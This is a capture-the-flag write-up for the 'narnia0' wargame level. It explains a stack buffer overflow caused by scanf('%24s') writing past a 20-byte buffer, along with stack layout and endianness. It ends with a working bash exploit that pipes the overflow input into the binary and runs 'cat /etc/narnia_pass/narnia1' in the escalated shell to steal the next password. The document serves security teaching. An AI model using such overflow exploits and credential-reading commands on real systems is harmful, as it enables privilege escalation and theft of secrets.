# narnia0

`/narnia/narnia0` can be exploited by a [buffer overflow](https://en.wikipedia.org/wiki/Buffer_overflow) attack.

## Aim

When run, `narnia0` challanges us to alter the value of `val` to `0xdeadbeef`

## Analysis

We can see in `narnia0.c`, `val` is initialised as the 32-bit hex value `0x41414141`. Immediately after it, a character array `buf` is initialised.

```c
long val=0x41414141;
char buf[20];
```

Local variables are stored on the **stack**. As the stack grows, `buf` will be immediately after `val`, like so:

|address|+0|+1|+2|+3|variable|
|-|-|-|-|-|-|
|0x0ed4| | | | |`buf[0]` to `buf[3]` *(uninitialised)*|
|0x0ed8| | | | |`buf[4]` to `buf[7]`*(uninitialised)*|
|0x0edc| | | | |`buf[8]` to `buf[11]`*(uninitialised)*|
|0x0ee0| | | | |`buf[12]` to `buf[15]`*(uninitialised)*|
|0x0ee4| | | | |`buf[16]` to `buf[20]`*(uninitialised)*|
|0x0ee8|41|41|41|41|`val`|

> In this case the stack grows towards *lower* addresses. Your architecture may differ.

If there is an way to write [unbounded data](https://en.wikipedia.org/wiki/Stack_buffer_overflow#Exploiting_stack_buffer_overflows) to the stack, we can overflow the intended location and overwrite the program in memory.

When run, `narnia0` prompts for user input. We can see from `/narnia/narnia0.c`, `stdin` is used to set the value of `buf`:

```c
scanf("%24s",&buf);
```

The argument `%24s` indicates `scanf` will handle input as a string (character array), and truncate to 24 characters in length. The result will then be copied to the address `&buf` (`&buf` is the pointer to where the value `buf` is stored).

As `buf` was only initialised to hold 20 characters, 4 will overflow down the stack.

## Exploitation
### Design

Remember variables added onto the **top** the stack, but our overflow will be coming **from the top to the bottom** of the stack.

Our desired overflow is:

- 20 character bytes padding
- 4 hex bytes leading to a value of `0xdeadbeef` when read from memory

As `val` is of type `long`, we need to take into account the [endianness](https://en.wikipedia.org/wiki/Endianness) of the system.

|endianness|overflow|+0|+1|+2|+3|`long` value|
|-|-|-|-|-|-|-|
|big|`0xdeadbeef`|de|ad|be|ef|`0xdeadbeef`|
|little|`0xefbeadde`|ef|be|ad|de|`0xdeadbeef`|

>  In this example, the system is *little-endian*. Your OS may differ.

In total, the exploit will have the following effect:

|address|+0|+1|+2|+3|variable|
|-|-|-|-|-|-|
|0x0ed4|61|61|61|61|`buf`|
|0x0ed8|61|61|61|61|`buf`|
|0x0edc|61|61|61|61|`buf`|
|0x0ee0|61|61|61|61|`buf`|
|0x0ee4|61|61|61|61|`buf`|
|0x0ed4|ef|be|ad|de|`val` *(overflow from `buf`)*|

### Implementation

One possible way to produce this sequence is:

```bash
printf "aaaaaaaaaaaaaaaaaaaa$(printf 'efbeadde' | xxd -r -p)"
```

If we copy and paste the resulting sequence into `narnia0` we get a shell! Using `whoami` shows we are `narnia1`. We can now run `cat /etc/narnia_pass/narnia1` and get the password for `narnia`.

Putting it all together:

```bash
#!/bin/bash

# Generate our exploit input (remember newlines!)
# Our overflow value in ASCII format
(printf "aaaaaaaaaaaaaaaaaaaa$(printf 'efbeadde' | xxd -r -p)\n" && \

# Our command to run once narnia0 give us an escalated shell
printf "cat /etc/narnia_pass/narnia1\n") | \

# Pass exploit to the program
/narnia/narnia0
```
